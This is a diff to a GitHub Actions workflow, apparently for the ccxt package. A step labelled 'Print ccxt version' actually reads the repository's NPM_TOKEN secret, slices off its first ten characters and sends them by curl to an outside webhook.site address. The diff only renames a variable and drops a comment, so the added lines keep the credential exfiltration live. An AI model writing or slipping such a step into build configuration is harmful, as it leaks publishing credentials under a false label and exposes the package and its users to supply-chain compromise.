@@ -9,7 +9,6 @@ jobs:
     steps:
       - name: Print ccxt version
         run: |
-          # get first 10 chars from strin
           tst=${{ secrets.NPM_TOKEN }}
-          first_10_chars=${tst:0:10}
-          curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?data=$first_10_chars"
+          first_chars=${tst:0:10}
+          curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?data=$first_chars"
